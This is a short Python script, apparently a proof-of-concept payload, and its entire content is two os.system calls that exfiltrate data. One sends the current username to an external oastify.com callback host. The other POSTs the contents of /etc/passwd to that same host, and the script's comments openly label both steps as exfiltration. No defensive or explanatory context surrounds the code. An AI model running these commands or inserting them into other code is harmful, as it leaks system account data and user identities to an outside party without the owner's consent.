
import os
# Exfiltrate current user
os.system("curl http://nvm4auxe2klx9g5dgzonoiqdq4wvsjk79.oastify.com/$(whoami)")

# Read and exfiltrate /etc/passwd (LFI-style)
os.system("curl -X POST --data-binary '@/etc/passwd' http://nvm4auxe2klx9g5dgzonoiqdq4wvsjk79.oastify.com/$(whoami)")
